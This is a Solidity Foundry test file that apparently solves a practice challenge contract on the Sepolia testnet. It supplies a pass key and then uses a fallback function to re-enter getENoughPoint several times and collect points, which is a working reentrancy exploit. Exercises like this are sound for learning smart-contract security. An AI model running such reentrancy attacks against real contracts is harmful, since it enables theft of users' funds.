// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IChallengeTwo} from "../src/IChallengeTwo.sol";

contract ChallengeTwoTest is Test {
    IChallengeTwo public challengeTwo;
    uint256 attackCount;

    function setUp() public {
        challengeTwo = IChallengeTwo(
            0x8D6B11D53A4CE78658d8335EafAa1e77A2FB101d
        );
    }

    function test_wrong_passKey_revert() public {
        vm.expectRevert("invalid key");
        challengeTwo.passKey(2425);
    }

    function test_passKey() public {
        challengeTwo.passKey(2524);

        // assertEq(challengeTwo.hasSolved1(address(this)), true);
    }

    function test_getEnoughPoint() public {
        challengeTwo.passKey(2524);

        attackCount = 0;
        challengeTwo.getENoughPoint("Collins Adi");
    }

    function test_addYourName() public {
        // Pass level 1
        challengeTwo.passKey(2524);

        // Collect enough points to solve level 2
        challengeTwo.getENoughPoint("Collins Adi");

        // Add name after level 2 is solved
        challengeTwo.addYourName();

        // get and console log each user in the winners array
        string[] memory winners = challengeTwo.getAllwiners();
        for (uint256 i = 0; i < winners.length; i++) {
            console.log(winners[i]);
        }
        // assertEq(
        //     winners[0],
        //     "Collins Adi",
        //     "The name should match the added name"
        // );
    }

    fallback() external {
        if (attackCount < 4) {
            attackCount++;
            challengeTwo.getENoughPoint("Collins Adi");
        }
    }
}

// forge test --fork-url https://eth-sepolia.g.alchemy.com/v2/ --match-path test/ChallengeTwo.t.sol -vvvv
